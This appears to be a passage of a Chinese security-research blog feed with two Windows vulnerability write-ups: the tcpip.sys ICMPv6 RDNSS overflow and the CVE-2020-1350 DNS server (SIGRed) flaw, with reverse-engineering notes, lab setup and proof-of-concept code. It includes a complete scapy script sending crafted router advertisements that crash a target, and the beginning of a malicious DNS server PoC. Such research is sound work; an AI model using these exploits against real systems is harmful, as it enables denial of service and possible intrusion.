href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisallocatenetbufferandnetbufferlist">NdisAllocateNetBufferAndNetBufferList</a></li></ul></blockquote><p>可能调用上述两个函数初始化此结构体。</p><blockquote><p>Chained to each NET_BUFFER structure are one or more buffer descriptors that map buffers that contain network packet data. These buffer descriptors are specified as an MDL chain in the <strong>NetBufferHeader</strong> member. Such network packet data either was received or will be transmitted.</p></blockquote><p>我理解就是使用一个叫做MDL的结构体对_NET_BUFFER的缓冲区进行描述。</p><p>然后可以调用 NdisGetDataBuffer函数以从NET_BUFFER结构访问连续的数据块；</p><p>我们不关注这个结构体每个字段具体的作用，了解上述信息即可。</p><h5 id="MDL结构体"><a href="#MDL结构体" class="headerlink" title="MDL结构体"></a>MDL结构体</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MDL</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">MDL</span>      *<span class="title">Next</span>;</span></span><br><span class="line">  CSHORT           Size;</span><br><span class="line">  CSHORT           MdlFlags;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span> *<span class="title">Process</span>;</span></span><br><span class="line">  PVOID            MappedSystemVa;</span><br><span class="line">  PVOID            StartVa;</span><br><span class="line">  ULONG            ByteCount;</span><br><span class="line">  ULONG            ByteOffset;</span><br><span class="line">&#125; MDL, *PMDL;</span><br></pre></td></tr></table></figure><blockquote><p>Chained to each NET_BUFFER structure are one or more buffer descriptors that map buffers that contain network packet data. These buffer descriptors are specified as an MDL chain in the <strong>NetBufferHeader</strong> member. Such network packet data either was received or will be transmitted.</p><p>To access additional data space in the MDL chain, NDIS drivers can call the following functions:</p><ul><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisretreatnetbufferdatastart">NdisRetreatNetBufferDataStart</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisretreatnetbufferlistdatastart">NdisRetreatNetBufferListDataStart</a></li></ul></blockquote><p>​    这个结构体的说明虽然我们看不太懂，但是大概意思就是说当需要使用NET BUFFER或者NET BUFFER LIST的内容时候，需要使用相应的MDL结构体，调用上述的函数进行调用。</p><blockquote><p>一个连续的虚拟内存地址范围可能是由多个分布（spread over）在不相邻的物理页所组成的。系统使用MDL（内存描述符表）结构体来表明虚拟内存缓冲区的物理页面布局。</p><p>总结：MDL就是描述一块虚拟内存的结构体，里面有个成员记录了多个页码，这些页码即处于各个不同物理地址的物理块的页号。</p><p><a href="http://www.doczj.com/doc/0a61613d9b6648d7c0c7460f.html">http://www.doczj.com/doc/0a61613d9b6648d7c0c7460f.html</a></p></blockquote><p>总结一下，就是我们有一个很复杂的NET BUFFER结构体，（大概因为结构体不是连续储存的？）与之对应的有一个MDL结构体来对应其指定的内存，当我们需要使用NET BUFFER中的信息时，需要使用NdisRetreatNetBufferDataStart函数进行调取数据。（其实没有太看懂，希望能有大佬解释）</p><h4 id="三、RDNSS-Option数据包："><a href="#三、RDNSS-Option数据包：" class="headerlink" title="三、RDNSS Option数据包："></a>三、RDNSS Option数据包：</h4><p>（本部分摘自<a href="https://blog.csdn.net/weixin_43815930/article/details/109328436%EF%BC%89">https://blog.csdn.net/weixin_43815930/article/details/109328436）</a></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20201028120008448.png" alt="在这里插入图片描述"></p><ul><li>Type:<br>大小为8bits即<strong>1字节</strong>，字面理解此字段用于表述类型，RDNSS 的类型为<strong>25</strong></li><li>Length:<br>大小为8bits即<strong>1字节</strong>，选项的长度（包括“Type”和“Length”字段）以8个八位位组。如果该选项中<strong>包含一个IPv6地址，则最小值为3</strong> 。每增加一个RDNSS地址，长度就会增加2(因为每个地址长16bits即2个字节）。接收器使用“Length”字段来确定选项中IPv6地址的数量。</li><li>Reserved:<br>大小为16bits，<strong>2字节</strong>，保留字段</li><li>Lifetime:<br>32bits即<strong>4字节</strong>无符号整数。该RDNSS地址可以用于名称解析的最长时间</li><li>Addresses of IPv6 Recursive DNS Servers：<br>一个或多个128位即<strong>16字节的IPv6地址</strong> 。地址数确定通过长度字段。也就是说，地址数等于（Length-1）/ 2。</li></ul><p>也就是说总长为<strong>24字节</strong>。</p><p>之所以要知道这个报文的结构，是因为漏洞就出现在进行报文解析的部分。</p><h3 id="三、tcpip-sys文件逆向分析"><a href="#三、tcpip-sys文件逆向分析" class="headerlink" title="三、tcpip.sys文件逆向分析"></a>三、tcpip.sys文件逆向分析</h3><p><em>Icmpv6ReceiveDatagrams( ) -&gt; Ipv6pHandleRouterAdvertisement( ) -&gt; Ipv6pUpdateRDNSS( )</em></p><p>先进入：<strong>Ipv6pUpdateRDNSS( )</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220314111529055.png" alt="image-20220314111529055"></p><p>v37就是（Length-1）/ 2，相当于地址的个数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220314114817247.png" alt="image-20220314114817247"></p><blockquote><p>在上面的处理过程中，存在一个问题：假设Length的长度为4，那么计算结束之后，AddressCount的值应该为1。</p><p>此时，按照正常逻辑，Ipv6pUpdateRDNSS()函数应该增加32字节（4*8）的缓冲区，但是后续在分配缓冲区时只分配了24字节：sizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24，从而导致了溢出。</p><p>根据RFC8106的标准，Length字段的值应该满足最小为3的奇数的情况。当提供一个偶数Length值时，Windows TCP/IP堆栈错误地将buffer前进了8个字节。</p><p>这主要是因为堆栈在内部以16字节为增量进行计数，并且没有使用非RFC兼容长度值的处理代码。这种不匹配导致堆栈将当前选项的最后8个字节解释为第二个选项的开始，最终导致缓冲区溢出和潜在的RCE。</p></blockquote><p>而crash原因的是GS机制的Security Cookie校验失败，也就是说要rce需要先搞定GS，我不会，所以受不了放弃了。</p><h2 id="0x04-利用条件"><a href="#0x04-利用条件" class="headerlink" title="0x04 利用条件"></a>0x04 利用条件</h2><ol><li><strong>基本条件</strong><ul><li>attacker需要获取target的IPv6和MAC地址</li></ul></li><li><strong>触发过程</strong><ul><li>attacker需要搭配其他内存泄漏或信息泄漏漏洞来实现RCE</li><li>attacker需要想办法绕过<code>tcpip.sys</code>的GS保护机制</li></ul></li></ol><p>attacker直接发送特制的ICMPv6路由广播数据包给target：</p><h2 id="0x05-poc脚本"><a href="#0x05-poc脚本" class="headerlink" title="0x05 poc脚本"></a>0x05 poc脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet6 <span class="keyword">import</span> ICMPv6NDOptEFA, ICMPv6NDOptRDNSS, ICMPv6ND_RA, IPv6, IPv6ExtHdrFragment, fragment6</span><br><span class="line"> </span><br><span class="line">v6_dst = <span class="string">&quot;target_ipv6&quot;</span><span class="comment">#受害机器的ipv6地址选取 “ipv6地址” 或 “临时ipv6地址”</span></span><br><span class="line">v6_src = <span class="string">&quot;attacker_ipv6&quot;</span><span class="comment">#攻击机的ipv6地址选取 “本地链接的ipv6地址”</span></span><br><span class="line"> </span><br><span class="line">p_test_half = <span class="string">&#x27;A&#x27;</span>.encode()*<span class="number">8</span> + <span class="string">b&quot;\x18\x30&quot;</span> + <span class="string">b&quot;\xFF\x18&quot;</span></span><br><span class="line">p_test = p_test_half + <span class="string">&#x27;A&#x27;</span>.encode()*<span class="number">4</span></span><br><span class="line"> </span><br><span class="line">c = ICMPv6NDOptEFA()</span><br><span class="line"> </span><br><span class="line">e = ICMPv6NDOptRDNSS()</span><br><span class="line">e.<span class="built_in">len</span> = <span class="number">21</span></span><br><span class="line">e.dns = [</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span> ]</span><br><span class="line"></span><br><span class="line">aaa = ICMPv6NDOptRDNSS()</span><br><span class="line">aaa.<span class="built_in">len</span> = <span class="number">8</span></span><br><span class="line">pkt = ICMPv6ND_RA() / aaa / \</span><br><span class="line">      Raw(load=<span class="string">&#x27;A&#x27;</span>.encode()*<span class="number">16</span>*<span class="number">2</span> + p_test_half + <span class="string">b&quot;\x18\xa0&quot;</span>*<span class="number">6</span>) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e</span><br><span class="line"> </span><br><span class="line">p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=<span class="number">255</span>)/ \</span><br><span class="line">              IPv6ExtHdrFragment()/pkt</span><br><span class="line"> </span><br><span class="line">l=fragment6(p_test_frag, <span class="number">200</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> l:</span><br><span class="line">    send(p)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311095109856.png" alt="image-20220311095109856"></p><p>打重启了。。。</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1350漏洞分析与复现</title>
      <link href="/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-1350漏洞分析与复现"><a href="#CVE-2020-1350漏洞分析与复现" class="headerlink" title="CVE-2020-1350漏洞分析与复现"></a>CVE-2020-1350漏洞分析与复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311162152726.png" alt="image-20220311162152726"></p><h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​    (CVE-2020-1350) 是 Windows DNS 服务器中的一个严重漏洞，其CVSS得分为10分，通过恶意DNS相应触发后，可以进行提权。</p><h2 id="0x02-DNS协议与攻击流程"><a href="#0x02-DNS协议与攻击流程" class="headerlink" title="0x02 DNS协议与攻击流程"></a>0x02 DNS协议与攻击流程</h2><h3 id="一、关于DNS协议"><a href="#一、关于DNS协议" class="headerlink" title="一、关于DNS协议"></a>一、关于DNS协议</h3><ul><li>DNS 通过 UDP/TCP 端口 53 运行。</li><li>单个 DNS 消息（响应/查询）在 UDP 中限制为 512 个字节，在 TCP 中限制为 65,535 个字节。</li></ul><h3 id="二、Windows中的DNS模块"><a href="#二、Windows中的DNS模块" class="headerlink" title="二、Windows中的DNS模块"></a>二、Windows中的DNS模块</h3><ul><li><strong>DNS客户端</strong>——<em>dnsapi.dll</em>负责DNS解析。</li><li><strong>DNS服务器</strong>——<em>dns.exe</em>负责回答DNS查询。</li></ul><p>我们的研究关键在于对于DNS服务器的攻击，也就是对于<em>dns.exe</em>的分析。</p><h3 id="三、通信流程"><a href="#三、通信流程" class="headerlink" title="三、通信流程"></a>三、通信流程</h3><p>要让被攻击的服务器解析来自我们恶意DNS服务器的响应，需要进行以下的通信流程：</p><ol><li>将<em>我们的域名(evilDomain.com)<em>的NS服务器（名称服务器）配置指向</em>我们的恶意DNS服务器（evilServer.com）</em>;</li><li>向<em>受害DNS服务器</em>发送查询请求，查询目标为*我们的域名(evilDomain.com)*；</li><li><em>受害DNS服务器</em>不知道答案，转发给上层的<em>权威服务器</em>，如<em>谷歌的DNS服务器</em>；</li><li><em>谷歌服务器</em>向受害者响应，告诉受害者<em>我们的恶意DNS服务器（evilServer.com）</em>是我们的*域名(evilDomain.com)*的名称服务器；</li><li>于是<em>受害者DNS服务器</em>储存此信息，然后向我们的恶意服务器<em>（evilServer.com）</em>发送请求；</li><li>我们的恶意服务器进行含有payloads的恶意回复；</li><li><em>受害DNS服务器</em>收到该回复时，在解析的过程中受到攻击</li></ol><p>由于无法在公网上进行实际测试，因此，我们就不进行1、2、3、4步骤，而是直接从第五步开始进行</p><h2 id="0x03-环境配置"><a href="#0x03-环境配置" class="headerlink" title="0x03 环境配置"></a>0x03 环境配置</h2><p>在上述过程中，存在多个主机：</p><p>​    向目标靶服务器<strong>T</strong>发送DNS查询请求的请求者 <strong>A</strong>，请求的内容为域名evil.com对应的服务器 <strong>M</strong>的ip地址，目标靶服务器<strong>T</strong>不知道<strong>M</strong>的ip地址，因此转发给上级权威服务器 <strong>B</strong>，权威服务器返回恶意服务器<strong>N</strong>的地址（这是因为<strong>N</strong>是<strong>M</strong>的名字服务器）。最终，<strong>T</strong>收到<strong>N</strong>的地址，向<strong>N</strong>请求<strong>M</strong>的地址。</p><p>​    虽然看起来有很多主机，但是实际我们需要模拟的只有<strong>A、N、T</strong>三台主机。</p><h3 id="网络配置（NAT）"><a href="#网络配置（NAT）" class="headerlink" title="网络配置（NAT）"></a>网络配置（NAT）</h3><p>需要的环境有：</p><p><em>Windows server 2016</em>——作为被攻击的对象（靶机):</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309151927723.png" alt="image-20220309151927723"></p><p><em>Windows server 2019</em>——作为恶意DNS服务器：</p><p>​    VMware双虚拟机最好采用NAT，同时关闭防火墙；</p><p>​    关闭恶意DNS服务器所在主机的DNS服务，否则影响脚本中的监听服务器。</p><p>安装python 3.9.0</p><h3 id="在Windows-server-2016上配置DNS服务"><a href="#在Windows-server-2016上配置DNS服务" class="headerlink" title="在Windows server 2016上配置DNS服务"></a>在Windows server 2016上配置DNS服务</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308125956554.png" alt="image-20220308125956554"></p><p>​    同时，复现过程还需要采用Windows DNS服务器的条件转发器，略过向权威NS查询的步骤，直接向恶意DNS服务器发出查询。</p><p>在恶意服务器（server2019）配置相关信息：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309170753233.png" alt="image-20220309170753233"></p><p>在靶机上配置条件转发器：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309224643368.png" alt="image-20220309224643368"></p><p>可以证明条件转发器配置正确；</p><p>之后的实验中，由于不需要再使用靶机的dns服务器，为了方便进行脚本的执行，我们将恶意服务器改为kali，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/cve-2020-1350.drawio.png" alt="cve-2020-1350.drawio"></p><h2 id="0x04-漏洞原理分析"><a href="#0x04-漏洞原理分析" class="headerlink" title="0x04 漏洞原理分析"></a>0x04 漏洞原理分析</h2><h3 id="一、函数逻辑分析"><a href="#一、函数逻辑分析" class="headerlink" title="一、函数逻辑分析"></a>一、函数逻辑分析</h3><p>找到checkpoint中提到的漏洞函数<code>SigWireRead()</code>，反汇编后并不长：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308145046333.png" alt="image-20220308145046333"></p><p>关键语句：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308145405637.png" alt="image-20220308145405637"></p><p><code>RR_AllocateEx()</code>用于分配堆内存首个参数为开辟的大小，其计算方式为：</p><p><code>[v10] + [0x14] + [v13[0]]</code></p><p>我们继续步入<code>RR_AllocateEx()</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308163625585.png" alt="image-20220308163625585"></p><p>可以看到函数第一个参数大小为int16，因此其最大值为2^16=65,536</p><p>通过汇编验证一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308164454709.png" alt="image-20220308164454709"></p><p>可以看到使用的时dx和cx（16位）寄存器的值，而非rdx、rcx。</p><p>因此，若可以使得传入的参数大于65,536，就可以导致整数溢出，然后<code>RR_AllocateEx()</code>函数就会开辟一片很小的空间，而在原函数<code>RR_AllocateEx()</code>中，很快就调用了memcpy函数。</p><p>很大的一块数据放入很小的一片堆内存，我们就可以进行缓冲区溢出攻击了。</p><h3 id="二、DNS协议流程分析"><a href="#二、DNS协议流程分析" class="headerlink" title="二、DNS协议流程分析"></a>二、DNS协议流程分析</h3><p>因此，现在首先要确定传入<code>RR_AllocateEx()</code>的第一个参数是否可能达成溢出。</p><p>​    回到<code>SigWireRead()</code>函数：<code>[v10] + [0x14] + [v13[0]]</code>的值由两个变量和一个常量组成，其本质为：<code>[Name_PacketNameToCountNameEx result] + [0x14] + [The Signature field’s length (rdi–rax)]</code>；</p><p>​    要利用这个数达成溢出，我们能够改变的只有[The Signature field’s length (rdi–rax)]，也就是签名字段的长度，那么我们就需要从DNS协议流程的角度分析，这个值是否能够人为改变呢。</p><h4 id="DNS包总结构："><a href="#DNS包总结构：" class="headerlink" title="DNS包总结构："></a>DNS包总结构：</h4><table><thead><tr><th>区域名称:</th><th>区域内容:</th></tr></thead><tbody><tr><td>Header</td><td>消息头部</td></tr><tr><td>Question</td><td>DNS请求</td></tr><tr><td>Answer</td><td>回答请求的资源记录（Resource Record(s)）</td></tr><tr><td>Authority</td><td>指向域的资源记录</td></tr><tr><td>Additional</td><td>其他资源记录</td></tr></tbody></table><h5 id="Header"><a href="#Header" class="headerlink" title="Header:"></a>Header:</h5><p>​    固定为12 字节，同一个查询和响应的 ID 是一样的，QR 指明当前是查询还是响应，OPCODE 指明是用标准查询还是反向查询，<strong>TC 表示UDP长度大于 512 时截断并用 TCP 再次请求</strong>，QDCOUNT 表示查询的数量，ANCOUNT 表示响应的数量。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02194631-b2a0d6c247a547c9955b91dd1b5ebe29.x-png" alt="img"></p><h5 id="Question："><a href="#Question：" class="headerlink" title="Question："></a>Question：</h5><p>​    主要由被查询的域名、查询类型和查询类组成，其中请求的域名中没有“.”，域名中的“.”被编码为元信息，指示接下来的多少字节是有效信息，试举一例：</p><p>​    我要请求<a href="http://www.google.com.hk/">www.google.com.hk</a>的A记录。</p><p>其中的QNAME段是：<em>03</em> 77 77 77 <em>06</em> 67 6f 6f 67 6c 65 <em>03</em> 63 6f 6d <em>02</em> 68 6b <em>00</em></p><p>其中斜体的就是所谓的元信息！（注意需要以0x00作为结尾）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02203442-4a6d8a568f584f6092d87f32a041dbe3.x-png" alt="img"></p><h5 id="Answer："><a href="#Answer：" class="headerlink" title="Answer："></a>Answer：</h5><p>​    响应部分，以及其他两部分，其结构都如下所示，其中NAME字段为域名，依然可以使用上文中提到的元信息表示法，但是存在另一种方法，即<strong>偏移表示法（域名压缩）</strong>。</p><p>​    域名压缩本意是为了解决dns报文中多次提到域名，浪费空间，就使用较短的表示方法表示域名：</p><p>压缩方法很简单，当一个域名中的标识符是压缩的，它的“计数”字节中的最高两位将被设置为11。这表示它是一个16 bit指针而不再是8 bit的计数字节。指针中的剩下14 bit表示该标识符在DNS报文中所在的位置偏移（<strong>相对于DNS报文头</strong>）。注意一个指针可能指向一个完整的域名，也可能只指向域名的结尾部分，并且一个域名也可以前半部分不压缩，仅对后半部分才应用指针压缩。此外嵌套压缩也是存在的，即指针指向的域名也可能是压缩的（包含一个指针）。</p><p>举个例子：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/879291_BK62PXN5P34V87F.png" alt="img"></p><p>（图片源自<a href="https://bbs.pediy.com/thread-260712.htm%EF%BC%89">https://bbs.pediy.com/thread-260712.htm）</a></p><p>​    图中蓝色的<code>C0 0C</code>部分就表示了一个压缩地址，转化为二进制后，除去两bit的1位置，剩下的表示偏移为C，表示相对报头的偏移为c。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02205855-a75a3b78ceea48b380c206f9efe280a8.x-png" alt="img"></p><h4 id="sig类型数据包"><a href="#sig类型数据包" class="headerlink" title="sig类型数据包"></a>sig类型数据包</h4><p>​    在上文中提到的question部分中，第二个字段是Qtype，表示了包的种类。为了触发漏洞，只有发送sig类型的数据包，才会调用<code>SigWireRead()</code>函数，进而才有可能利用漏洞！这部分对sig数据包做说明（其实就是上文响应区的RDATA字段。</p><p>维基百科：</p><table><thead><tr><th>SIG</th><th>24</th><th>RFC 2535</th><th>Signature</th><th>Signature record used in SIG(0) (RFC 2931) and TKEY (RFC 2930).[<a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#cite_note-rfc3755_sec3-7">7]</a> RFC 3755 designated RRSIG as the replacement for SIG for use within DNSSEC.[<a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#cite_note-rfc3755_sec3-7">7]</a></th></tr></thead></table><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/640" alt="图片"></p><p>各个字段的含义：</p><ul><li>type covered(2 octet): RRs的类型</li><li>algorithm(1 octet)：签名算法</li><li>labels(1 octet)：域名通配规则</li><li>original TTL(4 octet)：受签名保护的TTL</li><li>signature expiration(4 octet)：签名有效的起始时间</li><li>signature inception(4 octet)：签名有效的截至时间</li><li>key tag(2 octet)：公钥模数或RR的简单校验和</li><li>signer’s name：签名者的域名，可被压缩</li><li>signature：签名数据序列</li></ul><p>至此，已经完全的学习了利用此漏洞需要的背景知识，按照我们现在已有的信息，我们可以开始尝试漏洞利用。</p><h2 id="0x05-POC使用"><a href="#0x05-POC使用" class="headerlink" title="0x05 POC使用"></a>0x05 POC使用</h2><h3 id="一、数据构造原理"><a href="#一、数据构造原理" class="headerlink" title="一、数据构造原理"></a>一、数据构造原理</h3><p>在本部分中，我们参考<a href="*https://github.com/maxpl0it/CVE-2020-1350-DoS*">maxpl0it</a>的POC进行分析：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309134148733.png" alt="image-20220309134148733"></p><p>​    再次分析函数流程，先用<code>Name_PacketNameToCountNameEx()</code>计算原域名的长度，返回值用v8接到，v13 为 SIG中的 signature 长度，v10 为 SIG中 signer’s name 需要分配的空间。</p><p>​    即：v13 = 0xffff<em>（TCP包总长度）</em> - 12<em>（包头）</em> - len(queries)<em>（问题部分长度）</em>- 20<em>（0x14）</em><br>​            v10 = 源域名长度-当前域名长度（理应是同一个） = 0</p><p>这样一来，<code>v13+v10+0x14</code>就一定小于<code>0xffff</code></p><p>​    但是，我们可以通过上文中提到的域名压缩对v10的值进行人为干涉，让其指向我们可控长度的构造域名字段，从而更改v10的值。</p><h3 id="二、checkpoint-POC构造分析"><a href="#二、checkpoint-POC构造分析" class="headerlink" title="二、checkpoint POC构造分析"></a>二、checkpoint POC构造分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line"><span class="keyword">global</span> domain_compressed</span><br><span class="line"><span class="comment"># Setup</span></span><br><span class="line">domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The TCP port is contacted second</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">sock.listen(<span class="number">50</span>)</span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">connection, client_address = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Contents</span></span><br><span class="line">sig = <span class="string">&quot;\x00\x01&quot;</span> 